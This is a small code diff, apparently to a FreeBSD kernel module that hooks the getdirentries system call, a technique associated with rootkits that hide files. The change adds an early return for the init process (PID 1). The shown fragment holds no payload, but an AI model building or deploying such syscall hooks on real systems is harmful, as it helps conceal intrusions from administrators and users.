@@ -253,6 +253,11 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 	sys_getdirentries(td, syscall_args);
 	hook(sys_getdirentries, getdirentries_hook);
 
+	if (td->td_proc->p_pid == 1)
+	{
+		return(0);
+	}
+
 	size = td->td_retval[0];
 
 	if (size > 0)
